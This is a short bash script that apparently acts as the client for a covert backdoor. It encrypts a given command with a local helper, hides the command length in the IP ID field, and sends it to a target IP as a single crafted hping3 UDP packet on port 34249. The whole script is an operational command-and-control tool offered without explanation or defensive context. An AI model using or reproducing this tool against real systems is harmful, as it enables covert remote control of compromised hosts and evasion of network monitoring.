#!/bin/bash

if [ -z "$2" ]; then
    echo "$0 <ip> <command>"
    exit 1
fi

cmdlen=$(expr length "$2")
tcpid=$(./client_util -b $cmdlen)
srcprt=$(./client_util)
dstprt=34249
opts="-c 1 -2 -E /dev/stdin -d 100 -s $srcprt -p $dstprt -N $tcpid"
encryted=$(./client_util -e "$2")

echo "$encryted" | hping3 $opts $1
